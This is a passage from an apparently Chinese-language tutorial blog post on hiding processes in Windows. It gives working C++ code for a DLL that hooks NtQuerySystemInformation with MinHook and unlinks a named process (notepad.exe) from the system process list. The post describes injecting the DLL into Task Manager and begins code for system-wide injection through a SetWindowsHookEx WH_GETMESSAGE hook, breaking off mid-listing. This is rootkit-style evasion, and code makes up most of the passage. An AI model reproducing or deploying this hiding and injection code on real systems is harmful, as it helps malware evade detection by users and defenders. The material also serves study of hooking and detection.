        HANDLE UniqueProcessId;
    } _MY_SYSTEM_PROCESS_INFORMATION, * MY_SYSTEM_PROCESS_INFORMATION;
    // 定义一个指针函数类型
    typedef NTSTATUS(WINAPI* myNtQuerySystemInformation)(
        __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
        __inout    PVOID SystemInformation,
        __in       ULONG SystemInformationLength,
        __out_opt  PULONG ReturnLength
        );
    // 定义一个存放原函数的指针
    myNtQuerySystemInformation fpNtQuerySystemInformation = NULL;
    // 定义一个Hook函数,隐藏指定进程名程序
    NTSTATUS WINAPI HookedNtQuerySystemInformation(
        __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
        __inout    PVOID                    SystemInformation,
        __in       ULONG                    SystemInformationLength,
        __out_opt  PULONG                   ReturnLength
    ) {
        // 先正常调用原函数，获取返回值
        NTSTATUS status = fpNtQuerySystemInformation(SystemInformationClass,
            SystemInformation,
            SystemInformationLength,
            ReturnLength);
        // 判断是否是进程信息和调用是否成功
        if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status)) {
            MY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
            MY_SYSTEM_PROCESS_INFORMATION pNext = (MY_SYSTEM_PROCESS_INFORMATION)SystemInformation;
            // 单链表循环
            do
            {
                pCurrent = pNext;
                pNext = (MY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
                if (!wcsncmp(pNext->ImageName.Buffer, L"notepad.exe", pNext->ImageName.Length))
                {
                    //MessageBoxW(NULL, L"Hook notepad.exe ok!", L"Title", MB_OK);
                    if (0 == pNext->NextEntryOffset)
                    {
                        pCurrent->NextEntryOffset = 0;
                    }
                    else
                    {
                        pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                    }
                    // 这里能够跳过notepad.exe的指针
                    pNext = pCurrent;
                }
            } while (pNext->NextEntryOffset != 0);
        }
        // 正常返回
        return status;
    }
    // 封装MinHook的使用
    template 
    inline MH_STATUS MH_CreateHookEx(LPVOID pTarget, LPVOID pDetour, T** ppOriginal)
    {
        return MH_CreateHook(pTarget, pDetour, reinterpret_cast(ppOriginal));
    }
    template 
    inline MH_STATUS MH_CreateHookApiEx(
        LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)
    {
        return MH_CreateHookApi(
            pszModule, pszProcName, pDetour, reinterpret_cast(ppOriginal));
    }
    // 封装Hook函数
    BOOL Hook() {
        // 初始化MinHook
        MH_Initialize();
        // hook ntdll函数中的NtQuerySystemInformation
        MH_CreateHookApiEx(L"ntdll", "NtQuerySystemInformation", HookedNtQuerySystemInformation, &fpNtQuerySystemInformation);
        MH_EnableHook(MH_ALL_HOOKS);
        return true;
    }
    BOOL unHook() {
        MH_DisableHook(MH_ALL_HOOKS);
        MH_Uninitialize();
        return true;
    }
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            MessageBoxW(NULL, L"Hook ok!", L"Title", MB_OK);
            Hook();
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
其中关键的隐藏步骤代码，实现了控制进程的链表指针原本指向我们hook的进程的指针A，指向了Hook的进程指向的下一个进程指针B，然后`pNext=pCurrent`，将整体偏移到指针B的地址中去，从而在链结构中删去了需要Hook的进程，但是这个方法有一个弊端，如果枚举的时候直接根据地址偏移去找的话，还是可以找到的。
### 0x3.3 注入任务管理器
网上看到不少Hook的文章，喜欢在`case DLL_PROCESS_DETACH:`
添加`unhook`，用于人为使用`FreeLibrary`来卸载注入的DLL时，能够修正原来的进程空间的tramponline的改动的代码。  
但是经过笔者的多次测试，任务管理器自身就会不断触发DLL卸载的行为，导致如果加了这一行代码，那么就没办法实现隐藏进程的效果。如果不加的话，那么如果主动去卸载该DLL的话，那么会导致任务管理器因为寻址错误异常退出。
但是神奇的是，只会加载一次，然后切换任务管理器其他功能时就会触发DLL卸载行为。
那么为什么会这样呢 ？ 结合上面的情况和代码进行分析，可以发现，任务管理器会启动子线程去进行动态加载，把代码修改为如下，即可避免这个问题。  
每个情况，加一个`break;`即可防止向下执行。
**Hook notepad.exe 效果展示**  
使用一个简单的远程线程注入exe，代码参考:
然后卸载的时候
单击确定之后，记事本又回来了。
## 0x4 实现全局钩子&&全局注入
当然既然实现任务管理器Hook，那么PrcocessHacker可以不？ procmon64可以不？  
从原理出发的话，如果他们调用了`NtQuerySystemInformation`,那么就是可以的，但具体步骤比较繁琐，每次都要手动获取任务管理器进程和其他相关查看进程的程序的pid，然后手工注入隐藏的DLL，这未免显得太麻烦了，那么有没有只需要后台静默运行一个exe程序即可？  
答案是可以的，但是有其局限性，下面笔者展开来谈谈两个实现思路。
### 0x4.1 全局钩子SetWindowsHook
文档:  
用法:
    HHOOK SetWindowsHookExW( int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId );
> Installs an application-defined hook procedure into a hook chain. You would
> install a hook procedure to monitor the system for certain types of events.
> These events are associated either with a specific thread or with all
> threads in the same desktop as the calling thread.  
>  将应用程序定义的挂钩过程安装到挂钩链中。您将安装一个钩子过程来监视系统的某些类型事件。这些事件与特定线程或与调用线程位于同一桌面中的 **所有线程**
> 相关联。
>
> Window设计：Windows使用消息传递模型。 操作系统通过向应用程序窗口传递消息来与应用程序窗口通信。 消息只是一个指定特定事件的数值代码。
> 例如，如果用户按下鼠标左键，窗口将收到一条消息代码的消息。
下面是对钩子的原理简介:
>
> 为了能够让DLL注入所有的进程中，程序设置WH_GETMESSAGE消息的全局钩子。因为WH_GETMESSAGE类型的钩子会监视消息队列，由于Windows系统是基于消息驱动的，所以所有进程都会有自己的一个消息队列，都会加载WH_GETMESSAGE类型的全局钩子DLL。
> ----《Windows黑客编程技术详解》
**代码实现**
1) 编写信息处理回调函数
里面说明这个是可以在application定义或者库定义的，这个文档其实不是很明朗，我自己测试的时候，发现这个要是想全部程序都注入的话，要在DLL中编写这个函数，并且进行导出。
    extern "C" LRESULT __declspec(dllexport)GetMsgProc(
           int code,
           WPARAM wParam,
           LPARAM lParam);
       // 钩子回调函数
       LRESULT GetMsgProc(
           int code,
           WPARAM wParam,
           LPARAM lParam)
       {
           return ::CallNextHookEx(NULL, code, wParam, lParam);
       }
2) 编写SetWindowHook主体代码
这个代码流程就比较简单，照着文档写就可以。
    // GlobalSetWindowHook.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
       //
       #include 
       #include 
       #include 
       int _tmain(int argc, _TCHAR* argv[])
       {
        HMODULE hDll = LoadLibraryW(TEXT("C:\\Users\\XQ17\\source\\repos\\DLLGlOBALTEST\\x64\\Release\\DLLGlOBALTEST.dll"));
        if (hDll == NULL) {
            printf("LoadDLL Error: %d\n", GetLastError());
            return 0;
        }
        printf("Load DLL Success!\n");
           //这里用到了之前导出的MsgHookProc方法。
        HOOKPROC MsgHookProc = (HOOKPROC)GetProcAddress(hDll, "GetMsgProc");
        // 设置全局钩子
        HHOOK hhook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)MsgHookProc, hDll, 0);
        if (hhook == NULL) {